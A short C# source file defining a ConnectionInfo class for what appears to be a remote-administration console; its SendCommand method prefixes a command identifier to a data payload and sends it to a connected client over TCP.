using System;
using System.Net.Sockets;
using Orcus.Shared.Connection;
using System.Collections.Generic;

namespace Orcus.Administration.App
{
	public class ConnectionInfo
	{
		public ConnectionInfo(BaseClientInformation clientInfo, TcpClient tcpClient, Sender sender)
		{
			Sender = sender;
			TcpClient = tcpClient;
			ClientInformation = clientInfo;
		}

		public Sender Sender { get; private set; }
		public TcpClient TcpClient { get; private set; }
		public BaseClientInformation ClientInformation { get; private set; }

		public void SendCommand(Command command, byte[] data)
		{
			var package = new List<byte>();
			package.AddRange(BitConverter.GetBytes(command.Identifier));
			package.AddRange(data);

			Sender.Send(ClientInformation.Id, package.ToArray());
		}
	}
}